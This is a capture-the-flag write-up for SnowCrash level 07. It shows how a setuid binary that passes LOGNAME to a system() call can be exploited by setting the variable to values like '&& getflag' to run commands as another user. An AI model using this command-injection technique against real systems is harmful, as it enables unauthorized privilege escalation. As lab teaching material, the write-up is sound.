# LEVEL 07

## Vulnerability & exploit

System call by privileged user to echo env variable -> Privilege escalation via env variable

## Eternal resources

ltrace

## Initial context

In our home directory, we see an executable with suid/guid

```
level07@SnowCrash:~$ ls -la level07
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

## Solving the challenge

Let's try to understand what the program does by using the ltrace debugger:

```
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                       = 2007
geteuid()                                                       = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)             = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)             = 0
getenv("LOGNAME")                                               = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff46, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                          = 0
+++ exited (status 0) +++
```

We see that the program gets the environment variable LOGNAME.
Let's check its value and what happens if we change it:

```
level07@SnowCrash:~$ echo $LOGNAME
level07
level07@SnowCrash:~$ export LOGNAME="hello"
level07@SnowCrash:~$ ./level07
hello
```

We can deduce that the system call to /bin/echo is meant to display the value of LOGNAME.
This means that by changing this value, we can trick the program into executing a second command after /bin/echo.
This is a vulnerability, since the file as suid bit and therefore will run any command as user flag07:

```
level07@SnowCrash:~$ export LOGNAME="&& whoami"
level07@SnowCrash:~$ ./level07

flag07
```

So injecting getflag should yield the desired result:

```
level07@SnowCrash:~$ export LOGNAME="&& getflag"
level07@SnowCrash:~$ ./level07

Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXX
```
